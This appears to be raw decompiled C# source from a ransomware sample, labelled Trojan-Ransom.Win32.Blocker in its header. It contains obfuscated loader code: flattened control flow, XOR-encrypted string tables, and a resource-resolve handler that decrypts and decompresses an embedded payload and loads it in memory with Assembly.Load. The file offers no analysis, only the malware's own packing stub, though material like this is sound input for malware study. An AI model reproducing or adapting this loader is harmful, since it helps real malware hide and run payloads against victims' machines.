// Decompiled with JetBrains decompiler
// Type: ?1?.?3?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6B47CE0B-CA70-47B2-88AA-28518F14D243
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.chmc-3b9d973aba8141deb099278e50da424bc8c188e37cb4e02c90ee1cb062e20688.exe

using \u003F1\u003F;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.IO.Packaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;

namespace \u003F1\u003F
{
  internal sealed class \u003F3\u003F
  {
    static \u003F3\u003F() => \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F8\u003F();

    internal static MethodInfo \u003F1\u003F([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 109:
          num1 = 2;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
            num2 = 5;
            continue;
          case 2:
            goto label_8;
          case 5:
            goto label_3;
          case 6:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F1\u003F);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.EntryPoint;
    }

    internal static object \u003F2\u003F(
      [In] MethodBase obj0,
      [In] object obj1,
      [In] object[] obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 118:
          num1 = 1;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 6:
            num2 = 7;
            continue;
          case 1:
          case 3:
            goto label_8;
          case 5:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F2\u003F);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.Invoke(obj1, obj2);
    }

    internal static void \u003F8\u003F(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 107)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    internal sealed class \u003F4\u003F
    {
      internal static long \u003F3\u003F([In] Stream obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 67:
            num1 = 6;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 4:
            case 6:
              goto label_8;
            case 2:
              num2 = 5;
              continue;
            case 3:
              num2 = 5;
              continue;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F3\u003F);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.Length;
      }

      internal static Assembly \u003F8\u003F([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 96:
            num1 = 0;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              goto label_8;
            case 2:
            case 3:
              goto label_3;
            case 5:
              num2 = 2;
              continue;
            case 6:
              num2 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F8\u003F);
              num2 = 2;
              continue;
          }
        }
label_8:
        return Assembly.Load(obj0);
      }

      internal static Type \u003F7\u003F([In] RuntimeTypeHandle obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 89:
            num1 = 5;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 3:
              num2 = 2;
              continue;
            case 2:
              goto label_3;
            case 5:
            case 6:
              goto label_8;
            case 7:
              num2 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F7\u003F);
              num2 = 2;
              continue;
          }
        }
label_8:
        return Type.GetTypeFromHandle(obj0);
      }

      internal static Assembly \u003F2\u003F([In] Type obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 72:
            num1 = 6;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              num2 = 5;
              continue;
            case 3:
            case 7:
              num2 = 5;
              continue;
            case 4:
            case 6:
              goto label_8;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F2\u003F);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.Assembly;
      }

      internal static Stream \u003F6\u003F([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 63:
            num1 = 1;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 2:
            case 5:
              goto label_8;
            case 3:
            case 6:
              num2 = 0;
              continue;
            case 7:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F6\u003F);
              num2 = 0;
              continue;
          }
        }
label_8:
        return obj0.GetManifestResourceStream(obj1);
      }

      internal static Package \u003F9\u003F(
        [In] Stream obj0,
        [In] FileMode obj1,
        [In] FileAccess obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_3:
        int num1;
        switch (obj4 ^ obj3)
        {
          case 109:
            num1 = 6;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
            case 7:
              num2 = 1;
              continue;
            case 1:
              goto label_3;
            case 2:
            case 3:
              num2 = 1;
              continue;
            case 6:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F9\u003F);
              num2 = 1;
              continue;
          }
        }
label_8:
        return Package.Open(obj0, obj1, obj2);
      }

      internal static Assembly \u003F1\u003F([In] int obj0, [In] int obj1)
      {
label_0:
        switch ((obj1 ^ obj0) - 63)
        {
          case 0:
            return Assembly.GetExecutingAssembly();
          default:
            goto label_0;
        }
      }

      internal static Assembly \u003F4\u003F(
        [In] byte[] obj0,
        [In] byte[] obj1,
        [In] Evidence obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_0:
        switch ((obj4 ^ obj3) - (int) sbyte.MaxValue)
        {
          case 0:
            return Assembly.Load(obj0, obj1, obj2);
          default:
            goto label_0;
        }
      }

      internal sealed class \u003F5\u003F
      {
        private static bool \u003F9\u003F;
        private static readonly char[] \u003F3\u003F;
        private static readonly char[] \u003F7\u003F = new char[43]
        {
          char.MinValue,
          '(',
          char.MinValue,
          'ఋ',
          'ᇱ',
          'ſ',
          '᭵',
          'Ⴡ',
          '⡱',
          '⇏',
          '܂',
          '\u0C78',
          'ᇿ',
          'ŵ',
          'ᬇ',
          'Ⴠ',
          '⡳',
          '⇋',
          '܅',
          '\u0C0D',
          'ᇰ',
          'Ĉ',
          'ᬅ',
          '\u10C8',
          '⡰',
          '↺',
          '܋',
          'ఊ',
          'ᇾ',
          'ź',
          'ᬃ',
          '\u10C6',
          '⡷',
          '⇋',
          'ݰ',
          '\u0C79',
          'ᇷ',
          'ž',
          'ᬀ',
          'Ⴗ',
          '⠅',
          '⇈',
          '܄'
        };
        private static readonly string[] \u003F6\u003F;
        internal static \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F1\u003F \u003F14\u003F;

        internal static Assembly \u003F5\u003F(object _param0, ResolveEventArgs _param1)
        {
label_3:
          string str1 = \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F4\u003F(794923305, 5);
          string name = str1;
          string str2 = \u003F2\u003F.\u003F4\u003F((object) name, (object) '1', 662, 659);
          int num1 = 10;
          AppDomain appDomain;
          Dictionary<string, string> dictionary;
          Assembly assembly;
          Stream stream;
          byte[] buffer;
          int num2;
          int index1;
          while (true)
          {
            switch (num1)
            {
              case 0:
                if (dictionary == null)
                {
                  num1 = 4;
                  continue;
                }
                goto label_39;
              case 1:
                ++index1;
                num1 = 5;
                continue;
              case 2:
                buffer = new byte[\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F11\u003F(stream, 801, 859) - 1L];
                goto case 7;
              case 4:
                dictionary = new Dictionary<string, string>();
                \u003F2\u003F.\u003F9\u003F(appDomain, str2, (object) dictionary, 596, 535);
                num1 = 9;
                continue;
              case 5:
                num1 = index1 < buffer.Length ? 14 : 15;
                continue;
              case 6:
                goto label_3;
              case 7:
                num1 = 16;
                continue;
              case 8:
              case 13:
                goto label_10;
              case 9:
                assembly = \u003F3\u003F.\u003F4\u003F.\u003F1\u003F(26, 37);
                stream = \u003F3\u003F.\u003F6\u003F.\u003F14\u003F(assembly, str1, 544, 616);
                num1 = 11;
                continue;
              case 10:
                appDomain = \u003F2\u003F.\u003F1\u003F(439, 500);
                dictionary = (Dictionary<string, string>) \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F10\u003F(appDomain, str2, 164, 242);
                num1 = 0;
                continue;
              case 11:
                num1 = stream != null ? 2 : 13;
                continue;
              case 12:
              case 17:
                index1 = 0;
                num1 = 5;
                continue;
              case 14:
                buffer[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
                num1 = 1;
                continue;
              case 15:
                goto label_18;
              case 16:
                num2 = \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F12\u003F(stream, 990, 959);
                \u003F2\u003F.\u003F2\u003F(stream, buffer, 0, buffer.Length, 424, 446);
                num1 = 12;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F5\u003F);
                num1 = 6;
                continue;
            }
          }
label_10:
          return (Assembly) null;
label_18:
          MemoryStream memoryStream = new MemoryStream();
          DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
          try
          {
            int num3 = 5;
            byte[] numArray;
            int num4;
            while (true)
            {
              switch (num3)
              {
                case 0:
                  num3 = (num4 = \u003F2\u003F.\u003F2\u003F((Stream) deflateStream, numArray, 0, numArray.Length, 452, 467)) > 0 ? 6 : 3;
                  continue;
                case 3:
                  goto label_30;
                case 6:
                  \u003F3\u003F.\u003F8\u003F((Stream) memoryStream, numArray, 0, num4, 897, 1002);
                  goto case 0;
                case 7:
                  num3 = 0;
                  continue;
                default:
                  numArray = new byte[1024];
                  goto case 7;
              }
            }
          }
          finally
          {
            int num5 = 1;
            while (true)
            {
              switch (num5)
              {
                case 4:
                  goto label_29;
                case 5:
                  goto label_28;
                default:
                  num5 = deflateStream == null ? 4 : 5;
                  continue;
              }
            }
label_28:
            deflateStream.Dispose();
label_29:;
          }
label_30:
          int num6 = 7;
label_31:
          Assembly data;
          string[] manifestResourceNames;
          int index2;
          string key;
          while (true)
          {
            switch (num6)
            {
              case 0:
                num6 = index2 < manifestResourceNames.Length ? 6 : 12;
                continue;
              case 1:
                goto label_42;
              case 2:
                num6 = 4;
                continue;
              case 3:
              case 8:
                goto label_41;
              case 4:
                appDomain.SetData(name, (object) data);
                manifestResourceNames = data.GetManifestResourceNames();
                index2 = 0;
                num6 = 0;
                continue;
              case 5:
                dictionary[key] = key;
                ++index2;
                num6 = 0;
                continue;
              case 6:
                key = manifestResourceNames[index2];
                goto case 5;
              case 9:
                num6 = !dictionary.ContainsKey(_param1.Name) ? 1 : 8;
                continue;
              case 10:
                goto label_39;
              case 12:
                num6 = 9;
                continue;
              default:
                data = \u003F3\u003F.\u003F4\u003F.\u003F4\u003F(\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F13\u003F(memoryStream, 415, 401), (byte[]) null, \u003F2\u003F.\u003F7\u003F(assembly, 154, 149), 825, 838);
                goto case 2;
            }
          }
label_41:
          return data;
label_42:
          return (Assembly) null;
label_39:
          data = (Assembly) appDomain.GetData(name);
          num6 = 9;
          goto label_31;
        }

        internal static Type \u003F2\u003F([In] Exception obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 22:
              num1 = 1;
              break;
            default:
              num1 = 7;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 1:
              case 3:
              case 5:
                goto label_8;
              case 2:
                goto label_3;
              case 4:
              case 6:
                num2 = 2;
                continue;
              case 7:
                num2 = 2;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F2\u003F);
                num2 = 2;
                continue;
            }
          }
label_8:
          return obj0.GetType();
        }

        internal static void \u003F8\u003F()
        {
          int num1 = 0;
          while (true)
          {
            switch (num1)
            {
              case 2:
              case 4:
                goto label_4;
              default:
                if (!\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F9\u003F)
                {
                  num1 = 4;
                  continue;
                }
                goto label_14;
            }
          }
label_14:
          return;
label_4:
          lock (typeof (\u003F3\u003F.\u003F4\u003F.\u003F5\u003F))
          {
            int num2 = 1;
            while (true)
            {
              switch (num2)
              {
                case 2:
                case 5:
                  \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F9\u003F = true;
                  goto case 3;
                case 3:
                  AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F5\u003F);
                  num2 = 4;
                  continue;
                case 4:
                  goto label_11;
                default:
                  num2 = \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F9\u003F ? 4 : 2;
                  continue;
              }
            }
          }
label_11:
          int num3 = 3;
          while (true)
          {
            switch (num3)
            {
              case 1:
                goto label_18;
              case 2:
                goto label_17;
              case 4:
                goto label_15;
              case 5:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F8\u003F);
                num3 = 1;
                continue;
              default:
                num3 = 1;
                continue;
            }
          }
label_18:
          return;
label_17:
          return;
label_15:;
        }

        static \u003F5\u003F()
        {
          char[] chArray = new char[8]
          {
            char.MinValue,
            char.MinValue,
            char.MinValue,
            char.MinValue,
            char.MinValue,
            '⡆',
            char.MinValue,
            char.MinValue
          };
          chArray[0] = '\u0C3A';
          chArray[7] = 'ܲ';
          chArray[2] = 'Ō';
          chArray[4] = 'ჱ';
          chArray[3] = '᬴';
          chArray[6] = '↊';
          chArray[1] = 'ᇇ';
          \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F6\u003F = new string[1];
          \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F3\u003F = chArray;
        }

        internal static string \u003F4\u003F([In] int obj0, [In] int obj1)
        {
          int index1 = obj0 ^ 794923308 ^ obj1;
          char[] chArray1 = \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F7\u003F;
          int index2 = (int) chArray1[index1];
          string str1;
          if ((str1 = \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F6\u003F[index2]) != null)
            return str1;
          int num1 = (int) chArray1[index1 + 1];
          int length1 = ((int) chArray1[index1 + 2] << 16) + num1;
          char[] chArray2 = new char[length1];
          char[] chArray3 = \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F3\u003F;
          int length2 = chArray3.Length;
          int num2 = index1 + 3;
          for (int index3 = 0; index3 < length1; index3 = 1 + index3)
            chArray2[index3] = (char) ((uint) chArray1[num2 + index3] ^ (uint) chArray3[(index3 + index2) % length2]);
          string str2 = new string(chArray2);
          \u003F3\u003F.\u003F4\u003F.\u003F5\u003F.\u003F6\u003F[index2] = str2;
          return str2;
        }

        internal static object \u003F10\u003F([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
        {
label_0:
          switch ((obj3 ^ obj2) - 86)
          {
            case 0:
              return obj0.GetData(obj1);
            default:
              goto label_0;
          }
        }

        internal static long \u003F11\u003F([In] Stream obj0, [In] int obj1, [In] int obj2)
        {
label_0:
          switch ((obj2 ^ obj1) - 122)
          {
            case 0:
              return obj0.Length;
            default:
              goto label_0;
          }
        }

        internal static int \u003F12\u003F([In] Stream obj0, [In] int obj1, [In] int obj2)
        {
label_0:
          switch ((obj2 ^ obj1) - 97)
          {
            case 0:
              return obj0.ReadByte();
            default:
              goto label_0;
          }
        }

        internal static byte[] \u003F13\u003F([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
        {
label_0:
          switch ((obj2 ^ obj1) - 14)
          {
            case 0:
              return obj0.ToArray();
            default:
              goto label_0;
          }
        }

        [StructLayout(LayoutKind.Explicit, Size = 86, Pack = 1)]
        private struct \u003F1\u003F
        {
        }
      }
    }

    internal sealed class \u003F6\u003F
    {
      private static readonly char[] \u003F6\u003F;
      private static readonly char[] \u003F5\u003F;
      private static readonly string[] \u003F9\u003F;
      internal static \u003F3\u003F.\u003F6\u003F.\u003F7\u003F \u003F8\u003F;

      static \u003F6\u003F()
      {
        int num = 6;
        char[] chArray;
        while (true)
        {
          switch (num)
          {
            case 0:
              chArray[2] = 'ા';
              chArray[6] = '᷉';
              chArray[4] = 'ˠ';
              num = 4;
              continue;
            case 1:
              chArray[0] = '⣅';
              num = 2;
              continue;
            case 2:
            case 5:
              goto label_7;
            case 3:
              chArray[1] = 'Ἤ';
              num = 0;
              continue;
            case 4:
              chArray[7] = '∠';
              chArray[3] = 'ᤫ';
              goto case 1;
            default:
              \u003F3\u003F.\u003F6\u003F.\u003F5\u003F = new char[54]
              {
                char.MinValue,
                '\u0019',
                char.MinValue,
                '⢐',
                'ὂ',
                '\u0ADF',
                '᥉',
                'ʌ',
                '⏲',
                'ᷩ',
                '≔',
                '⢪',
                'Ἄ',
                '\u0AD2',
                '᥄',
                'ʁ',
                '⏳',
                'ᷩ',
                '≁',
                '⢶',
                'Ὗ',
                '\u0ADB',
                '᥆',
                'ʂ',
                '\u23FB',
                'ᶰ',
                '√',
                '⣥',
                '\u0001',
                '\u0005',
                char.MinValue,
                'Ὅ',
                'ઐ',
                'ᥑ',
                'ʉ',
                '⏧',
                '\u0002',
                '\v',
                char.MinValue,
                'ઑ',
                '\u1978',
                'ʅ',
                '⏥',
                'ᶿ',
                '≅',
                '⢷',
                'ἂ',
                '\u0ADB',
                'ᥓ',
                'ʅ',
                '\u0003',
                '\u0001',
                char.MinValue,
                'ᤡ'
              };
              chArray = new char[8];
              goto case 3;
          }
        }
label_7:
        chArray[5] = '⎗';
        \u003F3\u003F.\u003F6\u003F.\u003F9\u003F = new string[4];
        \u003F3\u003F.\u003F6\u003F.\u003F6\u003F = chArray;
      }

      internal static string \u003F4\u003F([In] int obj0, [In] int obj1)
      {
label_3:
        int index1 = obj0 ^ 794923308 ^ obj1;
        char[] chArray1 = \u003F3\u003F.\u003F6\u003F.\u003F5\u003F;
label_4:
        int index2 = (int) chArray1[index1];
        int num1 = 9;
        string str1;
        int length1;
        char[] chArray2;
        char[] chArray3;
        int length2;
        int index3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_13;
            case 2:
              index3 = 1 + index3;
              num1 = 7;
              continue;
            case 3:
            case 5:
            case 10:
              chArray2[index3] = (char) ((uint) chArray1[index1 + index3] ^ (uint) chArray3[(index3 + index2) % length2]);
              num1 = 2;
              continue;
            case 4:
              goto label_3;
            case 6:
              index3 = 0;
              num1 = 7;
              continue;
            case 7:
              num1 = index3 < length1 ? 5 : 0;
              continue;
            case 8:
              goto label_4;
            case 9:
              num1 = (str1 = \u003F3\u003F.\u003F6\u003F.\u003F9\u003F[index2]) == null ? 11 : 12;
              continue;
            case 11:
              int num2 = (int) chArray1[index1 + 1];
              length1 = ((int) chArray1[index1 + 2] << 16) + num2;
              num1 = 13;
              continue;
            case 12:
              goto label_6;
            case 13:
              chArray2 = new char[length1];
              chArray3 = \u003F3\u003F.\u003F6\u003F.\u003F6\u003F;
              length2 = chArray3.Length;
              index1 += 3;
              num1 = 6;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F6\u003F.\u003F4\u003F);
              num1 = 4;
              continue;
          }
        }
label_6:
        return str1;
label_13:
        string str2 = new string(chArray2);
        \u003F3\u003F.\u003F6\u003F.\u003F9\u003F[index2] = str2;
        return str2;
      }

      internal static PackagePart \u003F1\u003F(
        [In] Package obj0,
        [In] Uri obj1,
        [In] int obj2,
        [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 70:
            num1 = 7;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
            case 7:
              goto label_8;
            case 1:
            case 6:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 5:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F6\u003F.\u003F1\u003F);
              num2 = 3;
              continue;
          }
        }
label_8:
        return obj0.GetPart(obj1);
      }

      internal static int \u003F2\u003F(
        [In] Stream obj0,
        [In] byte[] obj1,
        [In] int obj2,
        [In] int obj3,
        [In] int obj4,
        [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 32:
            num1 = 2;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              num2 = 6;
              continue;
            case 1:
            case 3:
              num2 = 6;
              continue;
            case 2:
            case 5:
              goto label_8;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F6\u003F.\u003F2\u003F);
              num2 = 6;
              continue;
          }
        }
label_8:
        return obj0.Read(obj1, obj2, obj3);
      }

      internal static string \u003F3\u003F([In] MemberInfo obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 38:
            num1 = 1;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 7:
              goto label_8;
            case 2:
            case 4:
              num2 = 5;
              continue;
            case 3:
              num2 = 5;
              continue;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F3\u003F.\u003F6\u003F.\u003F3\u003F);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }

      internal static Stream \u003F14\u003F([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
label_0:
        switch ((obj3 ^ obj2) - 72)
        {
          case 0:
            return obj0.GetManifestResourceStream(obj1);
          default:
            goto label_0;
        }
      }

      [StructLayout(LayoutKind.Explicit, Size = 108, Pack = 1)]
      private struct \u003F7\u003F
      {
      }
    }
  }
}
